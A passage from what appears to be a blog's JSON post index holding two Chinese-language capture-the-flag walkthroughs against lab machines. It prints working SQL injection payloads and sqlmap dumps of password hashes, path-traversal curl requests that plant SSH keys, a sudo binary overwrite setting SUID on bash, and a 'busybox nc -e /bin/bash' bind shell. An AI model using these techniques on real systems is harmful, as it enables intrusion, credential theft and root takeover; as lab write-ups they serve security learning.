mysqli.allow_local_infile = On? Really? That's basically sending an open invitation to anyone with a payload and a dream.\n\nOh, and your CMS? Some of those plugins are a little too trusting. I tried asking the database a slightly unexpected question, and to my surprise\u2026 it answered. Very helpfully, in fact.\ud83e\uddd0\n\nDon't worry\u2014nothing happened (yet). But if I found these issues, someone less polite might too.\n\nJust a friendly heads-up: hardening is cheaper than recovering. \ud83d\ude05\n\nSincerely,\nA Concerned Internet Wanderer\n```\n\n\u6587\u7ae0\u6697\u793a\uff1a\n\n1. `mysqli.allow_local_infile = On` \u914d\u7f6e\u53ef\u80fd\u5b58\u5728\u5b89\u5168\u98ce\u9669\n2. WordPress\u63d2\u4ef6\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\n\n# \u4e09\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528\n\n## \u6f0f\u6d1e\u626b\u63cf\n\n\u4f7f\u7528nuclei\u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nuclei -u http://wordpress.local:8000/\n...\n[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index ['wordpress']\n...\n```\n\n\u53d1\u73b0CVE-2025-2011\u6f0f\u6d1e\uff0c\u8fd9\u662f\u4e00\u4e2aWordPress\u63d2\u4ef6\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n## SQL\u6ce8\u5165\u5229\u7528\n\n### \u68c0\u6d4b\u6ce8\u5165\u70b9\n\n\u4f7f\u7528sqlmap\u9a8c\u8bc1\u5e76\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index' -p s --dbs --batch\n...\nParameter: s (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: s=test') AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND ('Jhem'='Jhem&action=depicter-lead-index\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 5 columns\n    Payload: s=test') UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&action=depicter-lead-index\n...\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] wordpress\n[*] zabbix\n```\n\n### \u83b7\u53d6WordPress\u7528\u6237\u4fe1\u606f\n\n\u63d0\u53d6WordPress\u7528\u6237\u8868\u6570\u636e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index' -p s -D wordpress -T wp_users --dump       \n...\nDatabase: wordpress\nTable: wp_users\n[1 entry]\n+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| ID | user_url | user_pass                                                       | user_email      | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |\n+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| 1  | <blank>  | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | no@thankyou.com | adminer    | 0           | adminer      | adminer       | 2025-05-28 10:35:26 | <blank>             |\n+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n```\n\n\u83b7\u5f97\u7528\u6237\uff1a`adminer`\uff0c\u5bc6\u7801\u54c8\u5e0c\uff1a`$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq`\n\n### \u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\n\n\u5229\u7528MySQL\u7684LOAD_FILE\u51fd\u6570\u8bfb\u53d6`/etc/jimmy.txt`\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&action=depicter-lead-index' -p s --sql-query 'SELECT LOAD_FILE('/etc/jimmy.txt')' --batch\n...\nSELECT LOAD_FILE('/etc/jimmy.txt'): 'HandsomeHU\\n'\n```\n\n\u6210\u529f\u83b7\u53d6jimmy\u7528\u6237\u5bc6\u7801\uff1a`HandsomeHU`\n\n# \u56db\u3001\u7cfb\u7edf\u8bbf\u95ee\n\n## SSH\u767b\u5f55\n\n\u4f7f\u7528\u83b7\u53d6\u7684\u51ed\u636e\u767b\u5f55SSH\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh jimmy@192.168.205.131                                                                                                                                    \njimmy@192.168.205.131's password: \nLinux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n...\njimmy@Ximai:~$ echo $PATH\n./...\n```\n\n\u53d1\u73b0PATH\u73af\u5883\u53d8\u91cf\u88ab\u9650\u5236\uff0c\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\uff1a\n\n```bash\njimmy@Ximai:~$ export PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'\n```\n\n## \u4fe1\u606f\u6536\u96c6\n\n\u68c0\u67e5sudo\u6743\u9650\u548c\u7cfb\u7edf\u4fe1\u606f\uff1a\n\n```bash\njimmy@Ximai:~$ sudo -l\nSorry, user jimmy may not run sudo on Ximai.\n```\n\n\u67e5\u770bWordPress\u914d\u7f6e\u6587\u4ef6\uff1a\n\n```bash\njimmy@Ximai:/var/www/wordpress$ cat wp-config.php \n...\n/**\n * adminer:adminer123456\n */\n\n// ** Database settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wordpress' );\n\n/** Database username */\ndefine( 'DB_USER', 'root' );\n\n/** Database password */\ndefine( 'DB_PASSWORD', 'SuperSecret' );\n...\n```\n\n\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u53d1\u73b0adminer\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\uff1a`adminer123456`\n\n# \u4e94\u3001\u6743\u9650\u63d0\u5347\n\n## \u5207\u6362\u7528\u6237\n\n\u4f7f\u7528\u83b7\u53d6\u7684\u5bc6\u7801\u5207\u6362\u5230adminer\u7528\u6237\uff1a\n\n```bash\njimmy@Ximai:/tmp$ su adminer\nPassword: \nadminer@Ximai:/tmp$ sudo -l\nMatching Defaults entries for adminer on Ximai:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser adminer may run the following commands on Ximai:\n    (ALL) NOPASSWD: /usr/bin/grep\n```\n\n## \u5229\u7528sudo\u6743\u9650\n\n\u53d1\u73b0adminer\u7528\u6237\u53ef\u4ee5\u4ee5root\u6743\u9650\u6267\u884c`/usr/bin/grep`\u547d\u4ee4\uff0c\u4f46\u5b58\u5728\u9650\u5236\u3002\u68c0\u67e5grep\u6587\u4ef6\u6743\u9650\uff1a\n\n```bash\nadminer@Ximai:/tmp$ ls -la /usr/bin/grep\n-rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep\n```\n\n\u53d1\u73b0grep\u6587\u4ef6\u5177\u6709\u5199\u6743\u9650\uff0c\u53ef\u4ee5\u8986\u76d6\u5176\u5185\u5bb9\uff1a\n\n```bash\nadminer@Ximai:/tmp$ echo 'chmod +s /bin/bash' > /usr/bin/grep\nadminer@Ximai:/tmp$ sudo /usr/bin/grep\nadminer@Ximai:/tmp$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n```\n\n\u6210\u529f\u4e3abash\u6587\u4ef6\u8bbe\u7f6eSUID\u6743\u9650\uff0c\u83b7\u53d6root\u6743\u9650\uff1a\n\n```bash\nadminer@Ximai:/tmp$ bash -p\nbash-5.0# cat /root/r00t.txt /home/jimmy/us3r.txt \nflag{root-126e5653-3b02-11f0-b074-000c2921b441}\nflag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}\n```sentence", "top": 0, "createdAt": 1756611625, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-31", "dateLabelColor": "#0969da"}, "P238": {"htmlDir": "docs/post/nei-bu-_ll104567.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_ll104567", "postUrl": "post/nei-bu-_ll104567.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/238", "commentNum": 0, "wordCount": 5674, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\uff0c\u5728VMware NAT\u7f51\u7edc\u73af\u5883\u4e0b\uff0c\u4f7f\u7528`arp-scan`\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.156 08:00:27:f9:af:5d       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.156`\u3002\n\n\u63a5\u7740\uff0c\u4f7f\u7528`nmap`\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u6240\u6709\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p0-65535 192.168.205.156\n...\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n1045/tcp  open  fpitp\nMAC Address: 08:00:27:F9:AF:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u5f00\u653e\u4e86\u591a\u4e2a\u7aef\u53e3\uff0c\u5305\u62ecSSH(22)\u3001HTTP(80)\u3001SMB(139, 445)\u670d\u52a1\uff0c\u4ee5\u53ca\u4e00\u4e2a\u975e\u5e38\u89c4\u7684`1045`\u7aef\u53e3\u3002\n\n## 1.2 \u670d\u52a1\u7248\u672c\u63a2\u6d4b\n\n\u5bf9\u975e\u6807\u51c6\u7aef\u53e3`1045`\u8fdb\u884c\u8be6\u7ec6\u7684\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u548c\u811a\u672c\u626b\u63cf\uff0c\u4ee5\u4e86\u89e3\u5176\u8fd0\u884c\u7684\u5e94\u7528\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p1045 -sC -sV 192.168.205.156\n...\nPORT     STATE SERVICE VERSION\n1045/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2)\n|_http-server-header: Werkzeug/3.1.3 Python/3.9.2\n|_http-title: 404 Not Found\n```\n\n`1045`\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684\u662f\u4e00\u4e2a\u57fa\u4e8e`Python Werkzeug`\u7684HTTP\u670d\u52a1\u3002\u76f4\u63a5\u8bbf\u95ee\u65f6\u8fd4\u56de404\uff0c\u8fd9\u8868\u660e\u6211\u4eec\u9700\u8981\u5bfb\u627e\u6b63\u786e\u7684API\u8def\u5f84\u6216Web\u7aef\u70b9\u3002\n\n## 1.3 SMB\u4fe1\u606f\u679a\u4e3e\n\n\u7531\u4e8e\u76ee\u6807\u5f00\u653e\u4e86SMB\u670d\u52a1\uff0c\u4f7f\u7528`enum4linux-ng`\u8fdb\u884c\u8be6\u7ec6\u679a\u4e3e\uff0c\u5bfb\u627e\u53ef\u5229\u7528\u7684\u4fe1\u606f\uff0c\u5982\u5171\u4eab\u76ee\u5f55\u548c\u533f\u540d\u8bbf\u95ee\u6743\u9650\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ enum4linux-ng -A 192.168.205.156\n...\n =========================================\n|    Shares via RPC on 192.168.205.156    |\n =========================================\n[*] Enumerating shares\n[+] Found 3 share(s):\n...\nuser_files:\n  comment: User Files Share\n  type: Disk\n...\n[*] Testing share user_files\n[+] Mapping: OK, Listing: OK\n```\n\n\u679a\u4e3e\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `user_files` \u7684\u5171\u4eab\u76ee\u5f55\uff0c\u5e76\u4e14\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\u548c\u5217\u51fa\u6587\u4ef6\u3002\u5c1d\u8bd5\u8fde\u63a5\u540e\u53d1\u73b0\u76ee\u5f55\u4e3a\u7a7a\uff0c\u6682\u65f6\u6ca1\u6709\u53d1\u73b0\u53ef\u5229\u7528\u7684\u6587\u4ef6\u3002\n\n# \u4e8c\u3001Web\u670d\u52a1\u6e17\u900f\u4e0e\u6f0f\u6d1e\u5229\u7528\n\n## 2.1 Web\u4fe1\u606f\u63a2\u7d22\n\n\u8bbf\u95ee`80`\u7aef\u53e3\u7684HTTP\u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u201c\u540d\u5b57Gay\u6307\u6570\u8ba1\u7b97\u5668\u201d\u7684Web\u5e94\u7528\u3002\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4e00\u4e2a\u6ce8\u91ca\u63d0\u793a\uff0c\u8fd9\u53ef\u80fd\u662f\u540e\u7eed\u8ba4\u8bc1\u7684\u5173\u952e\u51ed\u8bc1\u3002\n\n```html\n<!-- xixilake-session-secure-2025 -->\n```\n\n\u8fd9\u4e2a\u6ce8\u91ca `xixilake-session-secure-2025` \u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u5bc6\u94a5\u6216Session\u4ee4\u724c\uff0c\u6211\u4eec\u5c06\u5176\u8bb0\u5f55\u4e0b\u6765\u4ee5\u5907\u540e\u7528\u3002\n\n## 2.2 API\u63a5\u53e3\u63a2\u7d22\u4e0e\u7a81\u7834\n\n\u8f6c\u5411`1045`\u7aef\u53e3\u7684Web\u670d\u52a1\uff0c\u5bf9\u5176\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u53d1\u73b0\u4e86`/api`\u8def\u5f84\uff0c\u5e76\u8fdb\u4e00\u6b65\u5728`/api`\u4e0b\u627e\u5230\u4e86`/api/health`\u7aef\u70b9\u3002\u8bbf\u95ee\u8be5\u7aef\u70b9\u83b7\u53d6\u4e86API\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u5176\u4e2d\u6700\u5173\u952e\u7684\u662f\u6307\u660e\u4e86\u7528\u4e8e\u6587\u4ef6\u64cd\u4f5c\u7684\u8def\u5f84\uff1a`/api/files/`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl http://192.168.205.156:1045/api/health\n{'available_endpoints':{'/api':'API information','/api/files/':'File operations',...}}\n```\n\n\u7ed3\u5408\u4e4b\u524d\u53d1\u73b0\u7684\u4ee4\u724c\uff0c\u6211\u4eec\u63a8\u65ad\u5b83\u53ef\u80fd\u7528\u4f5c`X-Session-Token`\u5934\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u3002\u9996\u5148\uff0c\u5728\u672c\u5730\u521b\u5efa\u4e00\u4e2a\u5305\u542bSSH\u516c\u94a5\u7684\u6587\u4ef6`authorized_keys`\uff0c\u7136\u540e\u5c1d\u8bd5\u5229\u7528\u6b64\u4ee4\u724c\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -X PUT -H 'X-Session-Token: xixilake-session-secure-2025' -T authorized_keys http://192.168.205.156:1045/api/files/authorized_keys\n{'message':'File authorized_keys uploaded successfully'}\n```\n\n\u4e0a\u4f20\u6210\u529f\uff01\u8fd9\u786e\u8ba4\u4e86\u6211\u4eec\u62e5\u6709\u901a\u8fc7API\u5411\u670d\u52a1\u5668\u7279\u5b9a\u76ee\u5f55\u5199\u5165\u6587\u4ef6\u7684\u80fd\u529b\u3002\n\n## 2.3 \u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u7684\u53d1\u73b0\u4e0e\u5229\u7528\n\n\u65e2\u7136\u53ef\u4ee5\u64cd\u4f5c\u6587\u4ef6\uff0c\u4e0b\u4e00\u6b65\u5c31\u662f\u6d4b\u8bd5\u662f\u5426\u5b58\u5728\u8def\u5f84\u904d\u5386\uff08Path Traversal\uff09\u6f0f\u6d1e\u3002\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u6784\u9020 `../` \u5e8f\u5217\u6765\u8bfb\u53d6\u4f4d\u4e8eWeb\u76ee\u5f55\u4e4b\u5916\u7684 `/etc/passwd` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl --path-as-is 'http://192.168.205.156:1045/api/files/../../../etc/passwd' -H 'X-Session-Token: xixilake-session-secure-2025'\nroot:x:0:0:root:/root:/bin/bash\n...\nll:x:1001:1001::/home/ll:/bin/bash\n```\n\n\u6210\u529f\u8bfb\u53d6\uff01\u8fd9\u8bc1\u660e\u4e86\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6b64\u6f0f\u6d1e\u83b7\u53d6\u4e00\u4e2a\u540d\u4e3a`ll`\u7684\u7528\u6237\u4fe1\u606f\u3002\n\n### **\u6280\u672f\u5256\u6790\uff1a\u5ba2\u6237\u7aef\u8def\u5f84\u89c4\u8303\u5316\u4e0e`--path-as-is`\u7684\u91cd\u8981\u6027**\n\n\u5728\u8fd9\u91cc\uff0c`--path-as-is`\u6807\u5fd7\u662f\u672c\u6b21\u6f0f\u6d1e\u5229\u7528\u6210\u529f\u7684**\u51b3\u5b9a\u6027\u56e0\u7d20**\u3002\u82e5\u7f3a\u5c11\u6b64\u6807\u5fd7\uff0c\u65e0\u8bba\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\u8fd8\u662f\u9ed8\u8ba4\u7684`curl`\u547d\u4ee4\uff0c\u653b\u51fb\u90fd\u4f1a\u5931\u8d25\u3002\u5176\u6839\u672c\u539f\u56e0\u5728\u4e8e**\u5ba2\u6237\u7aef\u8def\u5f84\u89c4\u8303\u5316 (Client-Side Path Normalization)**\u3002\n\n1.  **\u4e3a\u4ec0\u4e48\u6d4f\u89c8\u5668\u548c\u9ed8\u8ba4`curl`\u4f1a\u5931\u8d25\uff1f**\n    \u5f53\u4f60\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u6216\u6807\u51c6\u7684`curl`\u547d\u4ee4\u4e2d\u8f93\u5165\u5305\u542b `../` \u7684URL\u65f6\uff0c\u5ba2\u6237\u7aef\u5e94\u7528\uff08\u6d4f\u89c8\u5668\u6216curl\u7a0b\u5e8f\uff09\u4f1a\u5728\u53d1\u9001HTTP\u8bf7\u6c42**\u4e4b\u524d**\uff0c\u5c31\u201c\u667a\u80fd\u5730\u201d\u5bf9\u8def\u5f84\u8fdb\u884c\u6e05\u7406\u548c\u89c4\u8303\u5316\u3002\n    *   **\u8f93\u5165\u8def\u5f84**: `/api/files/../../../etc/passwd`\n    *   **\u5ba2\u6237\u7aef\u89c4\u8303\u5316\u540e**: `/etc/passwd`\n        \u6700\u7ec8\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u8def\u5f84\u662f `/etc/passwd`\uff0c\u8fd9\u4e2a\u8def\u5f84\u4e0d\u7b26\u5408\u5e94\u7528\u7684API\u8def\u7531\u89c4\u5219\uff0c\u56e0\u6b64\u65e0\u6cd5\u89e6\u53d1\u6f0f\u6d1e\uff0c\u5bfc\u81f4404\u9519\u8bef\u3002\n\n2.  **\u4e3a\u4ec0\u4e48`--path-as-is`\u80fd\u591f\u6210\u529f\uff1f**\n    \u6b64\u53c2\u6570\u7684\u4f5c\u7528\u662f\u544a\u8bc9`curl`**\u5173\u95ed\u5176\u9ed8\u8ba4\u7684\u8def\u5f84\u89c4\u8303\u5316\u529f\u80fd**\u3002\u5b83\u4f1a\u5c06URL\u4e2d\u7684\u8def\u5f84\u90e8\u5206 `../../../etc/passwd` \u539f\u5c01\u4e0d\u52a8\u5730\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u7531\u4e8e\u670d\u52a1\u7aef\u7684Python\u5e94\u7528\u4ee3\u7801\u5b58\u5728\u7f3a\u9677\uff0c\u6ca1\u6709\u5bf9\u63a5\u6536\u5230\u7684\u8def\u5f84\u8fdb\u884c\u5b89\u5168\u5904\u7406\uff0c\u56e0\u6b64\u76f4\u63a5\u62fc\u63a5\u5e76\u6267\u884c\u4e86\u6587\u4ef6\u64cd\u4f5c\uff0c\u6700\u7ec8\u5bfc\u81f4\u4e86\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u7684\u6210\u529f\u5229\u7528\u3002\n\n\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6211\u4eec\u4f7f\u7528`MOVE`\u65b9\u6cd5\u5c06\u4e4b\u524d\u4e0a\u4f20\u7684`authorized_keys`\u6587\u4ef6\u79fb\u52a8\u5230\u76ee\u6807\u7528\u6237`ll`\u7684`.ssh`\u76ee\u5f55\u4e0b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -X MOVE -H 'X-Session-Token: xixilake-session-secure-2025' -H 'Destination: ../../../home/ll/.ssh/authorized_keys' http://192.168.205.156:1045/api/files/authorized_keys\n{'message':'File moved to ../../../home/ll/.ssh/authorized_keys'}\n```\n\n\u6587\u4ef6\u79fb\u52a8\u6210\u529f\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7SSH\u514d\u5bc6\u767b\u5f55`ll`\u7528\u6237\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 3.1 \u83b7\u53d6\u521d\u59cbShell\n\n\u5229\u7528\u5df2\u5199\u5165\u7684SSH\u516c\u94a5\uff0c\u767b\u5f55\u76ee\u6807\u4e3b\u673a\uff0c\u83b7\u53d6\u4f4e\u6743\u9650shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh ll@192.168.205.156\n...\nll@104567:~$ id\nuid=1001(ll) gid=1001(ll) groups=1001(ll)\n```\n\n\u6210\u529f\u83b7\u53d6\u4e86`ll`\u7528\u6237\u7684shell\u3002\n\n## 3.2 Sudo\u6743\u9650\u5206\u6790\n\n\u68c0\u67e5\u5f53\u524d\u7528\u6237\u7684`sudo`\u6743\u9650\uff0c\u5bfb\u627e\u63d0\u6743\u7ebf\u7d22\u3002\n\n```bash\nll@104567:~$ sudo -l\n...\nUser ll may run the following commands on 104567:\n    (ALL : ALL) NOPASSWD: /usr/bin/toilet\n```\n\n\u53d1\u73b0`ll`\u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c`/usr/bin/toilet`\u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u5154\u5b50\u6d1e\u3002\n\n## 3.3 \u53d1\u73b0\u9ad8\u6743\u9650\u670d\u52a1\uff1aGlances\n\n\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\uff0c\u4f7f\u7528`ss -tnlp`\u67e5\u770b\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\uff0c\u5bfb\u627e\u53ef\u80fd\u7531\u9ad8\u6743\u9650\u7528\u6237\u542f\u52a8\u7684\u3001\u672a\u88ab\u5916\u7f51\u626b\u63cf\u53d1\u73b0\u7684\u670d\u52a1\u3002\n\n```bash\nll@104567:~$ ss -tnlp\nState    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port\n...\nLISTEN   0        128              0.0.0.0:61208          0.0.0.0:*\n...\n```\n\n\u53d1\u73b0\u4e86\u4e00\u4e2a\u65b0\u7684`61208`\u7aef\u53e3\u6b63\u5728\u76d1\u542c\u3002\u56de\u5230Kali\uff0c\u626b\u63cf\u8be5\u7aef\u53e3\uff0c\u786e\u8ba4\u5176\u8fd0\u884c\u7740\u4e00\u4e2a`Glances`\u7cfb\u7edf\u76d1\u63a7\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7\u76ee\u5f55\u626b\u63cf\u548c\u8bbf\u95ee`/openapi.json`\uff0c\u786e\u8ba4\u8fd9\u662f\u4e00\u4e2aAPI\u7248\u672c\u4e3aV4\u7684Glances\u670d\u52a1\u3002\n\n## 3.4 \u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u4e0e\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\n\n\u6839\u636eAPI\u6587\u6863\uff0c`/api/4/config`\u7aef\u70b9\u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8bfb\u53d6Glances\u7684\u914d\u7f6e\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl http://192.168.205.156:61208/api/4/config | jq\n{\n  'fs': {\n    'warning': '80',\n    'warning_action': 'busybox nc -lp 4567 -e /bin/bash',\n    'careful': '50',\n    'critical': '90'\n  },\n...\n}\n```\n\n\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u81f4\u547d\u7684\u914d\u7f6e\u9879`warning_action`\u3002\u5f53\u6587\u4ef6\u7cfb\u7edf\u4f7f\u7528\u7387\u8fbe\u523080%\u65f6\uff0c\u7531\u4e8eGlances\u670d\u52a1\u662f\u4ee5root\u6743\u9650\u8fd0\u884c\u7684\uff0c\u7cfb\u7edf\u4f1a\u4ee5**root\u6743\u9650**\u6267\u884c\u9884\u8bbe\u547d\u4ee4`busybox nc -lp 4567 -e /bin/bash`\uff0c\u4ece\u800c\u5f00\u542f\u4e00\u4e2a\u76d1\u542c\u57284567\u7aef\u53e3\u7684\u7ed1\u5b9a\u578bshell\u3002\n\n## 3.5 \u89e6\u53d1\u6f0f\u6d1e\u5e76\u83b7\u53d6Root Shell\n\n\u6211\u4eec\u53ea\u9700\u5728\u76ee\u6807\u673a\u4e0a\u521b\u5efa\u4e00\u4e2a\u5927\u6587\u4ef6\uff0c\u4f7f\u78c1\u76d8\u5360\u7528\u7387\u8d85\u8fc780%\u5373\u53ef\u89e6\u53d1\u8be5\u52a8\u4f5c\u3002\u6839\u636e\u4e3b\u673a\u4fe1\u606f\uff0c\u521b\u5efa\u4e00\u4e2a21G\u7684\u6587\u4ef6\u8db3\u4ee5\u89e6\u53d1\u3002\n\n\u5728`ll`\u7528\u6237\u7684shell\u4e2d\u6267\u884c\uff1a\n\n```bash\nll@104567:~$ dd if=/dev/zero of=/tmp/bigfile bs=1G count=21\n22548578304 bytes (23 GB, 21 GiB) copied...\n```\n\n\u6587\u4ef6\u521b\u5efa\u5b8c\u6210\u540e\uff0c\u7acb\u5373\u4eceKali\u8fde\u63a5\u76ee\u6807\u673a\u5f00\u542f\u76844567\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc 192.168.205.156 4567\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u8fde\u63a5\u5e76\u83b7\u53d6\u4e86root shell\u3002\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n\u5728root shell\u4e2d\uff0c\u8bfb\u53d6\u6240\u6709flag\u6587\u4ef6\u3002\n\n```bash\ncat /root/root.txt /home/ll/user.txt\nflag{root-f526a6c9f285aa9d001a459b42ef3035}\nflag{user-bc3c292e432690a9a0444bb46a559061}\n```\n\n\u6210\u529f\u83b7\u53d6\u6240\u6709Flag\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1756872352, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-09-03", "dateLabelColor": "#0969da"}, "P240": {"htmlDir": "docs/post/hmv_DC2.html", "labels": ["HackMyVM"], "postTitle": "hmv_DC2", "postUrl": "post/hmv_DC2.html", "postSourceUrl": 